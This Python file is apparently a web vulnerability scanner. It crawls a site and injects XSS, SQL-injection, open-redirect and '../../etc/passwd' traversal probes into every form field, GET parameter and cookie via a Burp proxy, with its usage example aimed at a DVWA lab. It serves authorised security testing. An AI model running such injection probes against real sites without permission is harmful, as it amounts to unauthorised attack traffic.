import requests 
from bs4 import BeautifulSoup
from urllib.parse import urlparse
from urllib.parse import urljoin
import time
import random
import string
import threading
from datetime import date
import urllib3
import urllib
import argparse, json
import sys 
import re

#import pdb

urllib3.disable_warnings()



#You can add default value for input form
default_param_value = {
    "phone_number_of_contact_person" : "75757575",
    "phone_number" : "85453621"
    }


#Your burpsuite parameters
proxies = {
   'http': 'http://127.0.0.1:8080',
   'https': 'http://127.0.0.1:8080'
}

#Please don't touch me, otherwise the vulnerability detection may fail
XSS_payload = '1" onmouseover=alert(97912) "'
SQLi_payload = "'"
OpenRedirect_Link = "https://google.com"
LFI = "../../../../../../../../../../../../../etc/passwd"

request_timeout = 60

available_payloads = [
    {"payload": XSS_payload, "action":"append"},
    {"payload": SQLi_payload, "action":"append"},
    {"payload": OpenRedirect_Link, "action":"replace"},
    {"payload": LFI, "action":"replace"},
]

processed_link = []
processed_action = []


def base_link_format(link):
    if (link.endswith('/') ):    
        return link[0 : len(link) - 1 ]

    if(link.rfind('/') < 8):
        return link

    link = link[0: link.rfind('/')]    
    return link

def get_link(current_link, href_str, base_url):
    
    sending_link = ""

    if ( href_str.__contains__('http://') or href_str.__contains__('https://') ):
        sending_link = href_str
    elif (href_str.startswith('/')):
        if (current_link.__contains__('https://')):
            sending_link = 'https://'+base_url + href_str
        else:
            sending_link = 'https://'+base_url + href_str
    elif (len(href_str.strip()) == 0):
        sending_link = current_link
    else:
        sending_link = base_link_format(current_link) + '/' + href_str
    
    return sending_link


def resolve_link(url):
    pattern = "[\.]+\/[a-zA-Z\/\._-]*"

    relative_url = re.findall(pattern, url)

    if not relative_url:
        return url

    relative_url = relative_url[0]
    base_url = url.split(relative_url)[0]
  
    return urljoin(base_url, relative_url)

def send_formular(form_link, action_link, method, params, cookies, headers, payload, action="append"):
    print("Sending payloads to "+ action_link)
    global proxies, request_timeout
    #print(params)

    for i in range(0, len(params)):

        params_copy = []
        for p_c in params:
            params_copy.append(p_c.copy())

        for pc in range(0, len(params_copy)):
            if( params_copy[pc]["name"].__contains__('token') or params_copy[pc]["name"].__contains__('csrf') ):
                try:
                    page2 = requests.get(form_link, headers=headers, cookies=cookies, proxies=proxies, verify=False, timeout=request_timeout)
                    soup2 = BeautifulSoup(page2.text, "lxml")
                    new_token = soup2.find("input", {"name":params_copy[pc]["name"]})["value"]
                    
                    params_copy[pc]["value"] = new_token
                except Exception as e:
                    print("Error while sending get request to "+form_link)
                    
        for j in range(0, len(params_copy)):
            if( j==i and action == "replace"):
                params_copy[i]["value"] =  payload
            elif(j==i):
                params_copy[i]["value"] = str(params_copy[i]["value"]) +  payload
              
        #build body parameters        
        params_to_be_sent = {}
        for p in params_copy:
            params_to_be_sent.update({p["name"]:p["value"]})

        thread_req = threading.Thread(target=send_request_as_thread, args=(action_link, params_to_be_sent, method.lower(), cookies, headers,))
        thread_req.start()

    params_to_be_sent = {}
    for p in params:
        params_to_be_sent.update({p["name"]:p["value"]})

    for i in range(0, len(cookies)):

        cookies_copy = cookies.copy()
        

        for index, key in enumerate(cookies_copy):
            if( index==i and action == "replace"):
                cookies_copy[key] =  payload
            elif(index==i):
                cookies_copy[key] = str(cookies_copy[key]) +  payload
                   

        thread_req = threading.Thread(target=send_request_as_thread, args=(action_link, params_to_be_sent, method.lower(), cookies_copy, headers,))
        thread_req.start()



def send_request_as_thread(action_link, params_to_be_sent, method, cookies, headers):
    global processed_action, proxies, request_timeout
    process_done={"link":action_link, "method":method, "cookie":cookies, "param":params_to_be_sent}
    if not process_done in processed_action:
        try:
            if (method == 'get'):
                requests.get(action_link, params_to_be_sent, cookies=cookies, headers=headers, proxies=proxies, verify=False, timeout=request_timeout)
            elif (method == 'post'):
                requests.post(action_link, params_to_be_sent, cookies=cookies, headers=headers, proxies=proxies, verify=False, timeout=request_timeout)
            processed_action.append(process_done)
        except Exception as e_send:
            print("Exception: Cannot proceed the following request")
            print(method.upper()+" "+action_link)
            print("Params")
            print(params_to_be_sent)
            print("Cookies")
            print(cookies)
            print()

def process_form_of_a_page(link, included_links, excluded_links, cookies, headers):
    global proxies, default_param_value, processed_link, processed_action, available_payloads, request_timeout
    print()
    print("Processing forms of "+link)
    try:
        page = requests.get(link, cookies=cookies, headers=headers, proxies=proxies, verify=False, timeout=request_timeout)
        soup = BeautifulSoup(page.text, "lxml")
        #for a in soup.findAll("a", attrs={"href":True}):
        forms = soup.findAll("form")
        
        
        #loop every form
        for form in forms:
            form_params = []
            name_processed = []
            #fill every input
            for input_param in form.findAll("input"):
                
                if(input_param.has_attr("name")):
                    if(input_param["name"] in default_param_value.keys()):
                        input_value = default_param_value.get(input_param["name"])
                    else:    
                        input_value = "default"

                        if(input_param.has_attr("type") and input_param["type"].lower() == "password"):
                            input_value = "P@$$w0rd123"
                        
                        if(input_param.has_attr("type") and input_param["type"].lower() == "email"):
                            input_value = "hello@hello.com"

                        if(input_param.has_attr("type") and input_param["type"].lower() == "url"):
                            input_value = "https://example.com"

                        if(input_param.has_attr("type") and input_param["type"].lower() == "date"):
                            input_value = date.today().strftime("%m/%d/%Y")
                        
                        if(input_param.has_attr("type") and input_param["type"].lower() == "time"):
                            input_value = "09:00"

                        if(input_param.has_attr("type") and input_param["type"].lower() == "number"):
                            input_value = 92929292
                            
                        if(input_param.has_attr("type") and input_param["type"].lower() == "checkbox"):
                            input_value = "on"

                        if(input_param.has_attr("type") and input_param["type"].lower() == "tel"):
                            input_value = "92929292"

                        if(input_param.has_attr("type") and input_param["type"].lower() == "submit" and not input_param.has_attr("value") ):
                            input_value = ""

                        if(input_param.has_attr("type") and input_param["type"].lower() == "text" and input_param.has_attr("class") and 'datepicker' in input_param["class"] ):
                            input_value = date.today().strftime("%m/%d/%Y")


                        if(input_param.has_attr("value")):
                            if(input_param.has_attr("type") and input_param["type"].lower()=="hidden"):
                                input_value = input_param["value"]
                            elif(len(input_param["value"]) > 0 ):
                                input_value = input_param["value"]

                    if not (input_param['name'] in name_processed):
                        form_params.append({
                            "name" : input_param['name'],
                            "value" : str(input_value)
                            })
                            
                        name_processed.append(input_param['name'])

            for input_param in form.findAll("textarea"):
    
                if(input_param.has_attr("name")):
                    if(input_param["name"] in default_param_value.keys()):
                        input_value = default_param_value.get(input_param["name"])
                    else:
                        input_value = " ".join("".join(random.choices(string.ascii_letters, k=5)) for k5 in range(15))

                    if(input_param.has_attr("value")):
                        if(input_param.has_attr("type") and input_param["type"].lower()=="hidden"):
                            input_value = input_param["value"]
                        elif(len(input_param["value"]) > 0 ):
                            input_value = input_param["value"]

                    if not (input_param['name'] in name_processed):
                        form_params.append({
                            "name" : input_param['name'],
                            "value" : input_value
                            })
                        name_processed.append(input_param['name'])


            for input_param in form.findAll("trix-editor"):
    
                if(input_param.has_attr("name")):
                    if(input_param["name"] in default_param_value.keys()):
                        input_value = default_param_value.get(input_param["name"])
                    else:
                        input_value = " ".join("".join(random.choices(string.ascii_letters, k=5)) for k5 in range(15))

                    if(input_param.has_attr("value")):
                        if(input_param.has_attr("type") and input_param["type"].lower()=="hidden"):
                            input_value = input_param["value"]
                        elif(len(input_param["value"]) > 0 ):
                            input_value = input_param["value"]

                    if not (input_param['name'] in name_processed):
                        form_params.append({
                            "name" : input_param['name'],
                            "value" : input_value
                            })
                        name_processed.append(input_param['name'])

            for input_param in form.findAll("select"):
                if(input_param.has_attr("name")):
                    if(input_param["name"] in default_param_value.keys()):
                        input_value = default_param_value.get(input_param["name"])
                    else:
                        #select default value
                        if( len(input_param.find_all("option")) > 1 and input_param.find_all("option")[0].has_attr("value")):
                            input_value = input_param.find_all("option")[random.randint(1, len(input_param.find_all("option")) - 1  )]["value"]
                        elif(len(input_param.find_all("option")) == 0 and input_param.find_all("option")[0].has_attr("value")):
                            input_value = input_param.find_all("option")[0]["value"]

                    if(input_param.has_attr("value")):
                        if(input_param.has_attr("type") and input_param["type"].lower()=="hidden"):
                            input_value = input_param["value"]
                        elif(len(input_param["value"]) > 0 ):
                            input_value = input_param["value"]

                    if not (input_param['name'] in name_processed):
                        form_params.append({
                            "name" : input_param['name'],
                            "value" : input_value
                            })
                        name_processed.append(input_param['name'])

            for input_param in form.findAll("button"):
                
                if(input_param.has_attr("name")):

                    if(input_param["name"] in default_param_value.keys()):
                        input_value = default_param_value.get(input_param["name"])
                    else:
                        input_value = "Submit"
                        if(input_param.has_attr("value") ):
                            input_value = input_param["value"]

                    if(input_param.has_attr("value")):
                        if(input_param.has_attr("type") and input_param["type"].lower()=="hidden"):
                            input_value = input_param["value"]
                        elif(len(input_param["value"]) > 0 ):
                            input_value = input_param["value"]

                    if not (input_param['name'] in name_processed):
                        form_params.append({
                            "name" : input_param['name'],
                            "value" : input_value
                            })
                        name_processed.append(input_param['name'])   
                        

            #print(form_params)
            #send requests depending on the method

            form_action = ""
            if(form.has_attr("action")):
                form_action = form['action']
            
            form_method = ""
            if(form.has_attr("method")):
                form_method = form['method']
            
            
            if(form_method != ""):

                sending_link = get_link(link, form_action, urlparse(link).netloc)
                
                if(in_scope(link, included_links, excluded_links) ):
                    for av_payload in available_payloads:
                       
                        send_formular(link, sending_link, form_method, form_params, cookies, headers, av_payload["payload"], av_payload["action"])
                        send_formular(link, sending_link, form_method, form_params, cookies, headers, urllib.parse.quote(av_payload["payload"]), av_payload["action"])
            
    except Exception as e:
        print(e)
        print("Error while processing forms at "+link)


    processed_link.append(link)

    return 


def process_get_form(link, included_links, excluded_links, cookies, headers, params):
    global processed_action, available_payloads

    if(in_scope(link, included_links, excluded_links) ):
        for av_payload in available_payloads:   
            send_formular(link, link, "get", params, cookies, headers, av_payload["payload"], av_payload["action"])
            send_formular(link, link, "get", params, cookies, headers, urllib.parse.quote(av_payload["payload"]), av_payload["action"])
                


def quick_process_ready_get_form(link, included_links, excluded_links, cookies, headers):
    
    base_url = link.split("?")[0]
    param_strings = link.split("?")[1]

    form_params = []

    if "=" in param_strings and "&" in param_strings:
        for param_string in param_strings.split("&"):
            form_params.append({
                "name":param_string.split("=")[0],
                "value":param_string.split("=")[1]
            })

    elif "=" in param_strings and not "&" in param_strings:
        form_params.append({
            "name":param_strings.split("=")[0],
            "value":param_strings.split("=")[1]
        })

    elif not "=" in param_strings and not "&" in param_strings:
        form_params.append({
            "name":param_strings,
            "value":"default"
        })
    print()
    print("Processing "+link)
    print("==================")
    print(form_params)
    print("==================")
    process_get_form(base_url, included_links, excluded_links, cookies, headers, form_params)    

    return

def is_get_link(link):
    # ? in link
    if "?" in link:
        return True
    
    return False

def get_all_clickable_link(url, cookies, headers, save_state):
    global processed_link, request_timeout

    link = resolve_link(url)
    page = None
    try:
        page = requests.get(link, cookies=cookies, headers=headers, verify=False, timeout=request_timeout)
        
    except Exception as e:
	    print("Error when trying to scrap "+link)

    
    soup = BeautifulSoup(page.text, "lxml")
    href_list = []
    return_link_list = []
    
    for a in soup.findAll("a", attrs={"href":True}):
        if(len(a['href']) > 0):
            if a['href'][0] != '#' and 'javascript:' not in a['href'].strip() and 'mailto:' not in a['href'].strip() and 'tel:' not in a['href'].strip():
                if 'http' in a['href'].strip() or 'https' in a['href'].strip():
                    if urlparse(link).netloc.lower() in urlparse(a['href'].strip()).netloc.lower():
                        if a['href'] not in href_list:
                            href_list.append(a['href'])
                else:
                    if a['href'] not in href_list:
                        href_list.append(get_link(link, a['href'], urlparse(link).netloc))
        
    
    for href_i in href_list:
        href_item = resolve_link(href_i)
        if href_item not in processed_link:
            return_link_list.append(href_item)

    if(save_state == "True"):
        processed_link.append(link)

    return return_link_list       


def send_payload(links, included_links, excluded_links, cookies, headers):
    global processed_link

    for link in links:
        link = resolve_link(link)
        if (in_scope(link, included_links, excluded_links)):
            if not is_get_link(link):
                if(not link in processed_link):
                    process_form_of_a_page(link, included_links, excluded_links, cookies, headers)
            else:    
                quick_process_ready_get_form(link, included_links, excluded_links, cookies, headers)


def start_process(url, cookies, headers, included_links, excluded_links):
    global processed_link, available_payloads

    link = resolve_link(url)
    

    print("Processing "+url)
    print()

    links = get_all_clickable_link(link, cookies=cookies, headers=headers, save_state="True")
 
    send_payload(links, included_links=included_links, excluded_links=excluded_links, cookies=cookies, headers=headers)
    processed_link.append(link)

    

def in_scope(link, included_list, excluded_list):
    
    for inc in included_list:    
        if not re.findall(re.compile(inc), link):
            return False
    
    for exc in excluded_list:    
        if re.findall(re.compile(exc), link):
            return False

    return True


def main():

    parser = argparse.ArgumentParser(description="""Payload launcher by shinningstar. Make sure to set your proxy and to install BurpBugNotifier plugin.

   
    
    Ex: python3 payload_launcher.py -l http://192.168.43.16/DVWA2/ -c '{"PHPSESSID": "ockufsp8jup8j1qc5u13o1kq1f", "security": "low"}' -H  '{"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}' -e http://192.168.43.16/DVWA2/logout.php """)

    parser.add_argument('-l', '--link', type=str, help='Link URL')
    parser.add_argument('-e', '--exclude', nargs='+', type=str, help='Regex of excluded links separated by space')
    parser.add_argument('-i', '--include', nargs='+', type=str, help='Regex of included links separated by space: this will be used as whitelist')
    parser.add_argument('-c', '--cookie', type=str, help='Cookie dictionary')
    parser.add_argument('-H', '--header', type=str, help='Headers dictionary')
    
    args = parser.parse_args()

    if not args.link:
        parser.print_help() 
        sys.exit(1)  

   
    link = args.link

    if args.cookie:
        # Parse the cookie argument as a dictionary
        try:
            cookie = json.loads(args.cookie)
        except json.JSONDecodeError:
            print("Invalid JSON format for the cookie argument")
            return
    else:
        cookie =  {}

    if args.header:
        # Parse the header argument as a dictionary
        try:
            header = json.loads(args.header)
        except json.JSONDecodeError:
            print("Invalid JSON format for the header argument")
            return
    else:
        header =  {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1"}

    if args.exclude:
        exclude = args.exclude
    else:
        exclude = []

    if args.include:
        include = args.include
    else:
        include = []

   
    
    links = get_all_clickable_link(link, cookies=cookie, headers=header, save_state="False")

  
    
    for l in links:
        link = resolve_link(l)
        if (in_scope(link, include, exclude) ):
            if not is_get_link(link):
                start_process(link, cookies=cookie, headers=header, included_links=include, excluded_links=exclude)
            else:
                quick_process_ready_get_form(link, included_links=include, excluded_links=exclude, cookies=cookie, headers=header)

if __name__ == '__main__':
    main()